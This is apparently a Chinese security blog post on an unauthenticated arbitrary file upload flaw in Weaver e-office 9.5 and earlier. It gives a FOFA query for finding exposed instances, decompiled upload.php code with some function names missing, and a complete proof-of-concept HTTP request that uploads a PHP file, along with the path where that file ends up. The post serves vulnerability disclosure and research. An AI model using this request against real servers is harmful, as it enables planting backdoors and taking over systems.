---
title: "泛微e-office upload.php 文件上传漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-upload-rce.html
asset_dir: assets/泛微e-office-upload.php-文件上传漏洞
---

# 泛微e-office upload.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/15 08:20
* 1187浏览
* [0评论](#comment)
* 16分钟阅读

深入探索

Microsoft Office

webservice

office


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `webservice/upload.php`、 `webservice/upload/upload.php` 、`webservice-json/upload/upload.php` 和 `webservice-xml/upload/upload.php` 接口存在任意[文件上传](https://mrxn.net/tag/文件上传)漏洞，允许未经身份验证的攻击者上传恶意代码，植入后门，获取服务器权限，并控制整个 Web 服务器。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

由于四个文件的代码相同，这里以 `webservice/upload/upload.php`来看其业务逻辑

深入探索

安全认证考试

网络安全培训

漏洞预警服务

```
<?php
include_once( "inc/utility_all.php" );
$pathInfor = ( $_FILES['file']['tmp_name'] );
$extension = $pathInfor['extension'];
$role = UPLOADROLE;
$pos = $extension ? ( $role, ( $extension ) ) : false;
if ( !( $pos === false ) )
{
    echo "false";
}
else
{
    $attachmentID = ( $extension );
    global $ATTACH_PATH;
    $path = $ATTACH_PATH.$attachmentID;
    if ( !( $path ) )
    {
        ( $path, 448 );
    }
    $attachmentName = $_FILES['file']['tmp_name'];
    $fileName = $path."/".$_FILES['file']['name'];
    $fileName = ( "UTF-8", "GBK", $fileName );
    ( $_FILES['file']['tmp_name'], $fileName );
    if ( !( $fileName ) )
    {
        echo "false";
    }
    else
    {
        echo $attachmentID."*".$_FILES['file']['name'];
    }
}
?>
```

深入探索

企业安全咨询

网络安全课程

安全研究工具

可以明显看到，直接进行文件操作，无任何过滤或校验，导致任意文件上传漏洞。

漏洞修复方案

# 漏洞复现

```
POST /webservice/upload/upload.php HTTP/1.1
Host: eoffice.mrxn.net:8082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Length: 248

------WebKitFormBoundarySIELKZKzD7vQmdsO
Content-Disposition: form-data; name="file"; filename="test.php"

<?=md5(123456);unlink(__FILE__);
------WebKitFormBoundarySIELKZKzD7vQmdsO--
```

访问上传文件 `3601032174*test.php` 由响应内容拼接最终路径 `attachment/3601032174/test.php`

[![泛微e-office upload.php 文件上传漏洞](images/img-001-7dc96550bbc8.webp)](https://image.mrxn.net/4719a9f5ebdc42a697364809f4e309b0.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office upload.php 文件上传漏洞](https://mrxn.net/jswz/eoffice-webservice-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/eoffice-webservice-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

物流软件安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
